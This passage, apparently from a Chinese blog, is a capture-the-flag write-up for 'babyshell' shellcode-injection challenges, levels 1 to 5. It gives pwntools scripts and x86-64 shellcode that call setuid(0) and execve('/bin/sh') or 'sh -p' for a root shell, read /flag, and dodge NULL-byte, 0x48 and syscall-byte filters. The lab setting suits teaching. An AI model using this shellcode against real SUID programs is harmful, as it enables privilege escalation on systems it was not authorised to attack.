class="hljs-keyword">uint8_t</span>*)shellcode_addr)[i+k]);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    cs_close(&amp;handle);<br>&#125;<br><br><span class="hljs-keyword">void</span> *shellcode_mem;<br><span class="hljs-keyword">size_t</span> shellcode_size;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    assert(argc &gt; <span class="hljs-number">0</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;###\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;### Welcome to %s!\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;###\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;other tricks, this will sanitize all environment variables and arguments and close all file descriptors &gt; 2.\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">3</span>; i &lt; <span class="hljs-number">10000</span>; i++) close(i);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">char</span> **a = argv; *a != <span class="hljs-literal">NULL</span>; a++) <span class="hljs-built_in">memset</span>(*a, <span class="hljs-number">0</span>, <span class="hljs-built_in">strlen</span>(*a));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">char</span> **a = envp; *a != <span class="hljs-literal">NULL</span>; a++) <span class="hljs-built_in">memset</span>(*a, <span class="hljs-number">0</span>, <span class="hljs-built_in">strlen</span>(*a));<br><br>    <span class="hljs-keyword">uint8_t</span> shellcode[<span class="hljs-number">0x1000</span>];<br>    shellcode_mem = (<span class="hljs-keyword">void</span> *)&amp;shellcode;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[LEAK] Placing shellcode on the stack at %p!\n&quot;</span>, shellcode_mem);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;In this challenge, shellcode will be copied onto the stack and executed. Since the stack location is randomized on every&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;execution, your shellcode will need to be *position-independent*.\n&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Reading 0x1000 bytes from stdin.\n&quot;</span>);<br>    shellcode_size = read(<span class="hljs-number">0</span>, shellcode_mem, <span class="hljs-number">0x1000</span>);<br>    assert(shellcode_size &gt; <span class="hljs-number">0</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This challenge is about to execute the following shellcode:\n&quot;</span>);<br>    print_disassembly(shellcode_mem, shellcode_size);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Executing shellcode!\n&quot;</span>);<br>    ((<span class="hljs-keyword">void</span>(*)())shellcode_mem)();<br>&#125;<br></code></pre></td></tr></table></figure><p>用户的输入会作为二进制写入到栈上，然后作为函数调用</p><p>我们的目的是拿到 flag</p><p>有两种思路</p><ul><li>获得 root 权限的 shell</li><li>直接读取/flag</li></ul><h2 id="思路1"><a href="#思路1" class="headerlink" title="思路1"></a>思路1</h2><p>获得 root 权限的 shell</p><p>由于这个程序是个 suid 程序，因此，很容易想到注入一段触发执行<code>/bin/sh</code>程序的代码即可</p><p>触发启动 sh 的汇编代码：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-number">59</span>               # 设置 <span class="hljs-built_in">rax</span> 寄存器为 <span class="hljs-number">59</span>，表示系统调用 execve<br>    <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rip</span>+binsh]      # 将 /bin/sh 字符串地址放入 <span class="hljs-built_in">rdi</span> 寄存器<br>    <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsi</span>              # 将 <span class="hljs-built_in">rsi</span> 寄存器置零<br>    <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rdx</span>              # 将 <span class="hljs-built_in">rdx</span> 寄存器置零<br>    <span class="hljs-keyword">syscall</span>                      # 执行系统调用，启动 /bin/sh<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">binsh:</span><br><span class="hljs-meta">    .string</span> <span class="hljs-string">&quot;/bin/sh&quot;</span><br></code></pre></td></tr></table></figure><p>但是很遗憾，注入之后发现没有得到 root shell 而只是得到了普通 shell</p><p>源濑氏<del>咗田</del> 因为，shell 的保护机制：/bin/sh符号链接指向的是/bin/dash，dash和bash都有防御机制，当它们发现自己是在setuid进程中被执行的时候，就会euid为进程的真实用户id，放弃特权</p><p>重提一下相关概念</p><ul><li>eUID（Effective User ID）：表示正在执行命令的进程的有效用户ID。</li><li>rUID（Real User ID）：表示正在执行命令的进程的真实用户ID。</li></ul><p>一般这俩ID一样。但是如果程序是 suid 程序那么 ruid 保持原样， euid 是 root，程序以 root 权限执行</p><p>在这种情况下，如果<code>/bin/sh</code>被设置为SUID权限（suid标志被设置，即eUID为0但rUID不为0），它将降低权限到rUID。也就是说，eUID将被设置为rUID的值，而rUID不为0。</p><p>为了禁用这种行为，可以使用<code>sh -p</code>命令来执行<code>/bin/sh</code>。<code>-p</code>选项将使<code>/bin/sh</code>保持SUID权限，而不会降低为rUID</p><p>综上有俩方式：</p><ul><li>执行/bin/sh -p</li><li>执行/bin/sh 之前将 euid 置为 0</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>p = process(<span class="hljs-string">&#x27;/challenge/babyshell_level1&#x27;</span>)<br><br><span class="hljs-comment"># 执行 /bin/sh 以获取特权shell</span><br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    xor    rdi, rdi              # 设置 rdi 寄存器为 0，表示设置当前进程的有效用户 ID</span><br><span class="hljs-string">    mov    eax, 0x69             # 将系统调用号 105 (setuid) 放入 eax 寄存器</span><br><span class="hljs-string">    syscall                      # 执行系统调用，设置当前进程的有效用户 ID 为 0（root）</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    mov    rax, 59               # 设置 rax 寄存器为 59，表示系统调用 execve</span><br><span class="hljs-string">    lea    rdi, [rip+binsh]      # 将 /bin/sh 字符串地址放入 rdi 寄存器</span><br><span class="hljs-string">    xor    rsi, rsi              # 将 rsi 寄存器置零</span><br><span class="hljs-string">    xor    rdx, rdx              # 将 rdx 寄存器置零</span><br><span class="hljs-string">    syscall                      # 执行系统调用，启动 /bin/sh</span><br><span class="hljs-string"></span><br><span class="hljs-string">binsh:</span><br><span class="hljs-string">    .string &quot;/bin/sh&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>shellcode = asm(shellcode)<br><br>p.send(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h2><p>由于是 suid 程序，因此可以直接执行 cat /flag 命令读取内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>p=process(<span class="hljs-string">&quot;/challenge/babyshell_level1&quot;</span>)<br><br>shellcode=shellcraft.cat(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode=asm(shellcode)<br><br>p.send(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p>在 1 的基础上加了逻辑</p><ul><li>对标准输入的shellcode随机跳过一段长度（0x100到0x800字节）</li></ul> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">srand(time(<span class="hljs-literal">NULL</span>));<br><span class="hljs-keyword">int</span> to_skip = (rand() % <span class="hljs-number">0x700</span>) + <span class="hljs-number">0x100</span>;<br>shellcode_mem += to_skip;<br>shellcode_size -= to_skip;<br> <br></code></pre></td></tr></table></figure><p>思路</p><ul><li>把shellcode 放到后面，前面用捌佰个 nop 填充</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>p = process(<span class="hljs-string">&quot;/challenge/babyshell_level2&quot;</span>)<br><br><span class="hljs-comment"># 编写shellcode：读取&quot;/flag&quot;文件的内容</span><br>shellcode = shellcraft.cat(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode = asm(shellcode)<br><br>nop_sled_length = <span class="hljs-number">0x800</span><br>nop_sled = asm(<span class="hljs-string">&#x27;nop&#x27;</span>) * nop_sled_length<br><br><span class="hljs-comment"># 将nop sled和shellcode拼接</span><br>payload = nop_sled + shellcode<br><br>p.send(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><p>在1 的基础上加入了 <strong>Shellcode过滤</strong>：检查读入的shellcode是否包含NULL字节（<code>\x00</code>）</p><p>disasm 函数可以方便的看到字节码和汇编</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">print(disasm(shellcode))<br><br>   <span class="hljs-number">0</span>:   <span class="hljs-number">48</span> b8 <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span>   movabs <span class="hljs-built_in">rax</span>, <span class="hljs-number">0x101010101010101</span><br><span class="hljs-symbol">   a:</span>   <span class="hljs-number">50</span>                      <span class="hljs-keyword">push</span>   <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">   b:</span>   <span class="hljs-number">48</span> b8 2e <span class="hljs-number">67</span> <span class="hljs-number">6d</span> <span class="hljs-number">60</span> <span class="hljs-number">66</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span>   movabs <span class="hljs-built_in">rax</span>, <span class="hljs-number">0x1010166606d672e</span><br>  <span class="hljs-number">15</span>:   <span class="hljs-number">48</span> <span class="hljs-number">31</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span>             <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rsp</span>], <span class="hljs-built_in">rax</span><br>  <span class="hljs-number">19</span>:   6a <span class="hljs-number">02</span>                   <span class="hljs-keyword">push</span>   <span class="hljs-number">0x2</span><br>  <span class="hljs-number">1b</span>:   <span class="hljs-number">58</span>                      <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rax</span><br>  1c:   <span class="hljs-number">48</span> <span class="hljs-number">89</span> e7                <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br>  1f:   <span class="hljs-number">31</span> f6                   <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">esi</span>, <span class="hljs-built_in">esi</span><br>  <span class="hljs-number">21</span>:   0f <span class="hljs-number">05</span>                   <span class="hljs-keyword">syscall</span> <br>  <span class="hljs-number">23</span>:   <span class="hljs-number">41</span> ba ff ff ff 7f       <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r10d</span>, <span class="hljs-number">0x7fffffff</span><br>  <span class="hljs-number">29</span>:   <span class="hljs-number">48</span> <span class="hljs-number">89</span> c6                <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span><br>  2c:   6a <span class="hljs-number">28</span>                   <span class="hljs-keyword">push</span>   <span class="hljs-number">0x28</span><br>  2e:   <span class="hljs-number">58</span>                      <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rax</span><br>  2f:   6a <span class="hljs-number">01</span>                   <span class="hljs-keyword">push</span>   <span class="hljs-number">0x1</span><br>  <span class="hljs-number">31</span>:   5f                      <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rdi</span><br>  <span class="hljs-number">32</span>:   <span class="hljs-number">99</span>                      <span class="hljs-keyword">cdq</span>    <br>  <span class="hljs-number">33</span>:   0f <span class="hljs-number">05</span>                   <span class="hljs-keyword">syscall</span><br>  <br>  <br>print(<span class="hljs-string">&quot;Does shellcode contain NULL bytes?&quot;</span>, b<span class="hljs-string">&#x27;\x00&#x27;</span> <span class="hljs-keyword">in</span> shellcode)<br><br>Does shellcode contain NULL bytes? False<br></code></pre></td></tr></table></figure><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路 1"></a>思路 1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>p = process(<span class="hljs-string">&quot;/challenge/babyshell_level3&quot;</span>)<br><br>shellcode=shellcraft.cat(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode=asm(shellcode)<br><span class="hljs-built_in">print</span>(shellcode)<br><span class="hljs-built_in">print</span>(disasm(shellcode))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Does shellcode contain NULL bytes?&quot;</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span> <span class="hljs-keyword">in</span> shellcode)<br><br>p.send(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路 2"></a>思路 2</h2><p>pushstr 可以将字符串压栈但是不引入\x00</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">pwnlib.shellcraft.amd64.linux.<span class="hljs-built_in">read</span>(fd=<span class="hljs-number">0</span>, buffer=<span class="hljs-string">&#x27;rsp&#x27;</span>, count=<span class="hljs-number">8</span>)[source]<br>Reads data <span class="hljs-built_in">from</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> descriptor <span class="hljs-keyword">into</span> <span class="hljs-keyword">the</span> provided buffer. This is <span class="hljs-keyword">a</span> <span class="hljs-literal">one</span>-shot <span class="hljs-keyword">and</span> does <span class="hljs-keyword">not</span> fill <span class="hljs-keyword">the</span> request.<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>p = process(<span class="hljs-string">&quot;/challenge/babyshell_level3&quot;</span>)<br><br><span class="hljs-comment"># 使用 pushstr 压入 &quot;/flag&quot; 字符串而不包含 NULL 字节</span><br>shellcode = shellcraft.pushstr(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br><span class="hljs-comment"># 打开文件</span><br>shellcode += shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rsp&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)  <span class="hljs-comment"># &#x27;rsp&#x27; 指向刚推送的字符串</span><br><span class="hljs-comment"># 读取文件内容</span><br>shellcode += shellcraft.read(<span class="hljs-string">&#x27;rax&#x27;</span>, <span class="hljs-string">&#x27;rsp&#x27;</span>, <span class="hljs-number">1024</span>)  <span class="hljs-comment"># 假设我们读取最多1024字节</span><br><span class="hljs-comment"># 将文件内容写到标准输出</span><br>shellcode += shellcraft.write(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;rsp&#x27;</span>, <span class="hljs-string">&#x27;rax&#x27;</span>)<br><br>shellcode += shellcraft.exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># 编译 shellcode</span><br>binary_code = asm(shellcode)<br><br><span class="hljs-comment"># 打印生成的 shellcode 检查是否包含 NULL 字节</span><br><span class="hljs-built_in">print</span>(disasm(binary_code))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Does shellcode contain NULL bytes?&quot;</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span> <span class="hljs-keyword">in</span> binary_code)<br><br><br>p.send(binary_code)<br><br>p.interactive()<br><br>--- <br><br>   <span class="hljs-number">0</span>:   <span class="hljs-number">48</span> b8 01 01 01 01 01 01 01 01   movabs rax, <span class="hljs-number">0x101010101010101</span><br>   a:   <span class="hljs-number">50</span>                      push   rax<br>   b:   <span class="hljs-number">48</span> b8 2e <span class="hljs-number">67</span> 6d <span class="hljs-number">60</span> <span class="hljs-number">66</span> 01 01 01   movabs rax, <span class="hljs-number">0x1010166606d672e</span><br>  <span class="hljs-number">15</span>:   <span class="hljs-number">48</span> <span class="hljs-number">31</span> 04 <span class="hljs-number">24</span>             xor    QWORD PTR [rsp], rax<br>  <span class="hljs-number">19</span>:   <span class="hljs-number">48</span> <span class="hljs-number">89</span> e7                mov    rdi, rsp<br>  1c:   <span class="hljs-number">31</span> d2                   xor    edx, edx<br>  1e:   <span class="hljs-number">31</span> f6                   xor    esi, esi<br>  <span class="hljs-number">20</span>:   6a 02                   push   <span class="hljs-number">0x2</span><br>  <span class="hljs-number">22</span>:   <span class="hljs-number">58</span>                      pop    rax<br>  <span class="hljs-number">23</span>:   0f 05                   syscall <br>  <span class="hljs-number">25</span>:   <span class="hljs-number">48</span> <span class="hljs-number">89</span> c7                mov    rdi, rax<br>  <span class="hljs-number">28</span>:   <span class="hljs-number">31</span> c0                   xor    eax, eax<br>  2a:   <span class="hljs-number">31</span> d2                   xor    edx, edx<br>  2c:   b6 04                   mov    dh, <span class="hljs-number">0x4</span><br>  2e:   <span class="hljs-number">48</span> <span class="hljs-number">89</span> e6                mov    rsi, rsp<br>  <span class="hljs-number">31</span>:   0f 05                   syscall <br>  <span class="hljs-number">33</span>:   6a 01                   push   <span class="hljs-number">0x1</span><br>  <span class="hljs-number">35</span>:   5f                      pop    rdi<br>  <span class="hljs-number">36</span>:   <span class="hljs-number">48</span> <span class="hljs-number">89</span> c2                mov    rdx, rax<br>  <span class="hljs-number">39</span>:   <span class="hljs-number">48</span> <span class="hljs-number">89</span> e6                mov    rsi, rsp<br>  3c:   6a 01                   push   <span class="hljs-number">0x1</span><br>  3e:   <span class="hljs-number">58</span>                      pop    rax<br>  3f:   0f 05                   syscall <br>  <span class="hljs-number">41</span>:   <span class="hljs-number">31</span> ff                   xor    edi, edi<br>  <span class="hljs-number">43</span>:   6a 3c                   push   <span class="hljs-number">0x3c</span><br>  <span class="hljs-number">45</span>:   <span class="hljs-number">58</span>                      pop    rax<br>  <span class="hljs-number">46</span>:   0f 05                   syscall<br></code></pre></td></tr></table></figure><h1 id="4"><a href="#4" class="headerlink" title="4"></a>4</h1><p>不可以出现 \x48，也即是 H</p><p>但是对64 位寄存器进行操作，或者处理QWORD 这种 64 位数据，就会在指令级别加上神奇的 REX 导致\x48的出现</p><p>想解决此题，只需触发<code>execve(filepath, argv, envp)</code>函数</p><ul><li>filepath：”/bin/sh”（字符串地址）</li><li>argv<ul><li>argv[0]:”/bin/sh”</li><li>argv[1]:”-p”</li></ul></li><li>envp</li></ul><p>所以本质上是做了这两个事</p><ul><li>构造参数数组<ul><li>数组在内存中的组织方式</li><li>考虑下多维数组和字节序问题</li><li>这涉及到一些指针</li></ul></li><li>调用 execve 系统调用</li></ul><p>/bin//sh字符串想要入栈该怎么操作？如果 push 进去或者 mov 会不可避免的涉及到\x48。因此可以利用call函数时会返回地址压栈的特性，将字符串的地址压入栈，这样就可以获取切绕过 48</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs asm">from pwn import *<br><br>context.arch = &#x27;amd64&#x27;<br>context.os = &#x27;linux&#x27;<br><br>p = process(&quot;/challenge/babyshell_level4&quot;)<br><br>shellcode = asm(<br>&quot;&quot;&quot;<br>    jmp two<br>one:<br>    pop rdi //get file path,the 1st arg<br><br>    push 0x0  //end of -p<br>    push 0x702d // -p<br>    push rsp   // addr of -p<br>    pop rdx // rdx &lt;- addr<br>    <br>    push 0x0  //end of argv<br>    push rdx  //addr of -p<br>    push rdi  //addr of /bin/sh<br>    push rsp  //addr of argv<br>    pop rsi   //rsi &lt;- addr of argv<br>    <br>    push 0x0  //envp<br>    pop rdx   //rdx &lt;- 0<br>    push 0x3b <br>    pop rax   //rax &lt;- 0<br>    <br>    syscall<br>two:<br>    call one<br>    .string &quot;/bin/bash&quot;<br>&quot;&quot;&quot;)<br>p.send(shellcode)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="5"><a href="#5" class="headerlink" title="5"></a>5</h1><p>禁用 0x0f05，因此需要通过动态修改字节来达成 syscall 调用</p><p>此路不通：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs vim">from pwn import *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br><span class="hljs-keyword">p</span> = process(<span class="hljs-string">&#x27;/challenge/babyshell_level5&#x27;</span>)<br><br># gdb.attach(<span class="hljs-keyword">p</span>) <br><br># 执行 /bin/<span class="hljs-keyword">sh</span> 以获取特权<span class="hljs-keyword">shell</span><br>shellcode = <span class="hljs-string">&quot;&quot;</span><span class="hljs-comment">&quot;</span><br>    <span class="hljs-built_in">xor</span>    rdi, rdi              # 设置 rdi 寄存器为 <span class="hljs-number">0</span>，表示设置当前进程的有效用户 ID<br>    mov    eax, <span class="hljs-number">0</span>x69             # 将系统调用号 <span class="hljs-number">105</span> (setuid) 放入 eax 寄存器<br>    push <span class="hljs-number">0</span>x050e<br>    inc qword <span class="hljs-keyword">ptr</span> [rsp]<br>    <span class="hljs-keyword">call</span> rsp<br>    nop<br>    mov    rax, <span class="hljs-number">59</span>               # 设置 rax 寄存器为 <span class="hljs-number">59</span>，表示系统调用 execve<br>    lea    rdi, [rip+binsh]      # 将 /bin/<span class="hljs-keyword">sh</span> 字符串地址放入 rdi 寄存器<br>    <span class="hljs-built_in">xor</span>    rsi, rsi              # 将 rsi 寄存器置零<br>    <span class="hljs-built_in">xor</span>    rdx, rdx              # 将 rdx 寄存器置零<br>    push <span class="hljs-number">0</span>x050e<br>    inc qword <span class="hljs-keyword">ptr</span> [rsp]<br>    <span class="hljs-keyword">call</span> rsp<br>    nop<br><br><br>binsh:<br>    .<span class="hljs-built_in">string</span> <span 